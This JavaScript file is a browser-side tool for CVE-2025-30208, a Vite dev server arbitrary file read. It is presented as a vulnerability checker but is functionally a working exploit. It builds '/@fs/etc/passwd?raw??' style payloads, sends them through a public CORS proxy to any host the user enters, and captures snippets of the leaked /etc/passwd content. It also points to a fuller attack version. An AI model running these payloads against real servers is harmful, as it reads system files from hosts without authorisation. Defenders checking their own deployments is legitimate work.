/**
 * CVE-2025-30208: Vite Arbitrary File Read Vulnerability Checker
 * Detects Arbitrary File Read vulnerability in Vite dev server
 */

const ADVANCED_PAYLOADS = [
    "/@fs/{file_path}?raw??",
    "/app/{file_path}?raw??",
    "/App/{file_path}?raw??",
];

const FILE_PATHS = [
    "etc/passwd",
];

function generatePayloads() {
    const result = [];
    for (const file of FILE_PATHS) {
        for (const tpl of ADVANCED_PAYLOADS) {
            result.push(tpl.replace("{file_path}", file));
        }
    }
    return result;
}

const PROXY_URL = 'https://cors-anywhere.herokuapp.com/';
const TARGET_HISTORY_KEY = 'cve_2025_30208_target_history';

function saveTargetHistory(target, result) {
    try {
        let history = JSON.parse(localStorage.getItem(TARGET_HISTORY_KEY) || '[]');
        history.unshift({ target, result, timestamp: new Date().toISOString() });
        history = history.slice(0, 10);
        localStorage.setItem(TARGET_HISTORY_KEY, JSON.stringify(history));
    } catch (error) {
        console.error('Error saving target history:', error);
    }
}

function getTargetHistory() {
    try {
        return JSON.parse(localStorage.getItem(TARGET_HISTORY_KEY) || '[]');
    } catch (error) {
        console.error('Error getting target history:', error);
        return [];
    }
}

function clearTargetHistory() {
    try {
        localStorage.removeItem(TARGET_HISTORY_KEY);
    } catch (error) {
        console.error('Error clearing target history:', error);
    }
}

async function checkViteVulnerability(targetUrl, port = 5173) {
    try {
        const cleanUrl = targetUrl.replace(/^https?:\/\//, '');
        let isVite = false;
        let successfulResponses = 0;
        let evidenceFiles = [];
        let responseTimes = [];
        let serverHeader = null;
        let rateLimitHit = false;
        let rateLimitMessage = '';

        // Check if the target is a Vite dev server
        try {
            const startTime = performance.now();
            const testUrl = `${PROXY_URL}http://${cleanUrl}:${port}/`;
            const response = await fetch(testUrl, {
                method: 'HEAD',
                headers: {
                    'User-Agent': 'Mozilla/5.0',
                    'Origin': window.location.origin,
                    'X-Requested-With': 'XMLHttpRequest'
                }
            });
            const endTime = performance.now();
            responseTimes.push(endTime - startTime);
            serverHeader = response.headers.get('server') || '';
            if (response.status === 429) {
                rateLimitHit = true;
                rateLimitMessage = 'Received HTTP 429 (Too Many Requests). This is caused by rate limiting from the proxy or target server. Please wait a few minutes, reduce scan speed, or use your own proxy (e.g., deploy your own CORS Anywhere instance).';
                throw new Error(rateLimitMessage);
            }
            if (serverHeader.toLowerCase().includes('vite') || response.headers.get('x-powered-by')?.toLowerCase().includes('vite')) {
                isVite = true;
            }
        } catch (error) {
            const result = {
                vulnerable: false,
                details: error.message || 'Target is not reachable',
                confidence: 'High',
                evidence: { error: error.message }
            };
            saveTargetHistory(`${cleanUrl}:${port}`, result);
            return result;
        }

        // Use generated payloads
        const PAYLOADS = generatePayloads();
        for (const endpoint of PAYLOADS) {
            const startTime = performance.now();
            const testUrl = `${PROXY_URL}http://${cleanUrl}:${port}${endpoint}`;
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 10000);
                const response = await fetch(testUrl, {
                    method: 'GET',
                    headers: {
                        'Accept': '*/*',
                        'User-Agent': 'Mozilla/5.0',
                        'X-Requested-With': 'XMLHttpRequest',
                        'Origin': window.location.origin
                    },
                    signal: controller.signal,
                    credentials: 'omit'
                });
                const endTime = performance.now();
                responseTimes.push(endTime - startTime);
                clearTimeout(timeoutId);
                if (response.status === 429) {
                    rateLimitHit = true;
                    rateLimitMessage = 'Received HTTP 429 (Too Many Requests). This is caused by rate limiting from the proxy or target server. Please wait a few minutes, reduce scan speed, or use your own proxy (e.g., deploy your own CORS Anywhere instance).';
                    throw new Error(rateLimitMessage);
                }
                if (response.status === 403) {
                    successfulResponses++;
                    evidenceFiles.push({ endpoint, snippet: `HTTP 403 (Forbidden): The file path may be incorrect, but a vulnerability is present. Try the full version at https://github.com/ThemeHackers/CVE-2025-30208 for advanced testing.` });
                    isVite = true;
                }
                if (response.status === 529) {
                    successfulResponses++;
                    evidenceFiles.push({ endpoint, snippet: `HTTP 529 (Service is overloaded): The server is overloaded. Please try again later or use the full version at https://github.com/ThemeHackers/CVE-2025-30208 for advanced testing.` });
                    isVite = true;
                }
                if (response.status === 200) {
                    const text = await response.text();
                    if (/root:|127\.0\.0\.1|localhost|\[fonts\]/.test(text)) {
                        successfulResponses++;
                        evidenceFiles.push({ endpoint, snippet: text.slice(0, 200) });
                    }
                    if (text.includes('VITE') || text.includes('vite')) {
                        isVite = true;
                    }
                }
            } catch (error) {
                if (rateLimitHit || (error.message && error.message.includes('429'))) {
                    const result = {
                        vulnerable: false,
                        details: rateLimitMessage || 'Rate limit exceeded (HTTP 429).',
                        confidence: 'Unknown',
                        evidence: { error: error.message, suggestion: 'Wait a few minutes, reduce scan speed, or use your own proxy.' }
                    };
                    saveTargetHistory(`${cleanUrl}:${port}`, result);
                    return result;
                }
            }
            await new Promise(resolve => setTimeout(resolve, 500));
        }

        const avgResponseTime = responseTimes.length > 0 ? responseTimes.reduce((a, b) => a + b, 0) / responseTimes.length : 0;
        let result;
        if (successfulResponses > 0 && isVite) {
            let extraMsg = '';
            if (evidenceFiles.some(e=>/HTTP 403/.test(e.snippet))) {
                extraMsg += ' (HTTP 403 detected: The file path may be incorrect. Try the full version at https://github.com/ThemeHackers/CVE-2025-30208 for advanced testing.)';
            }
            if (evidenceFiles.some(e=>/HTTP 529/.test(e.snippet))) {
                extraMsg += ' (HTTP 529 detected: The server is overloaded. Please try again later or use the full version at https://github.com/ThemeHackers/CVE-2025-30208 for advanced testing.)';
            }
            result = {
                vulnerable: true,
                details: 'Target is Vite dev server and vulnerable to Arbitrary File Read (CVE-2025-30208)'+extraMsg,
                confidence: 'High',
                evidence: { successfulResponses, evidenceFiles, avgResponseTime, serverHeader }
            };
        } else if (successfulResponses > 0) {
            let extraMsg = '';
            if (evidenceFiles.some(e=>/HTTP 403/.test(e.snippet))) {
                extraMsg += ' (HTTP 403 detected: The file path may be incorrect. Try the full version at https://github.com/ThemeHackers/CVE-2025-30208 for advanced testing.)';
            }
            if (evidenceFiles.some(e=>/HTTP 529/.test(e.snippet))) {
                extraMsg += ' (HTTP 529 detected: The server is overloaded. Please try again later or use the full version at https://github.com/ThemeHackers/CVE-2025-30208 for advanced testing.)';
            }
            result = {
                vulnerable: true,
                details: 'Target is vulnerable to Arbitrary File Read, but not confirmed as Vite dev server'+extraMsg,
                confidence: 'Medium',
                evidence: { successfulResponses, evidenceFiles, avgResponseTime, serverHeader }
            };
        } else {
            result = {
                vulnerable: false,
                details: 'Target is not vulnerable to Vite Arbitrary File Read (CVE-2025-30208)',
                confidence: 'Medium',
                evidence: { successfulResponses, evidenceFiles, avgResponseTime, serverHeader }
            };
        }
        saveTargetHistory(`${cleanUrl}:${port}`, result);
        return result;
    } catch (error) {
        const result = {
            vulnerable: false,
            details: error.message || 'Error occurred during check.',
            confidence: 'Unknown',
            evidence: { error: error.message, suggestion: 'If you see HTTP 429, wait a few minutes, reduce scan speed, or use your own proxy.' }
        };
        saveTargetHistory(targetUrl, result);
        return result;
    }
}

if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        checkViteVulnerability,
        getTargetHistory,
        clearTargetHistory
    };
} 
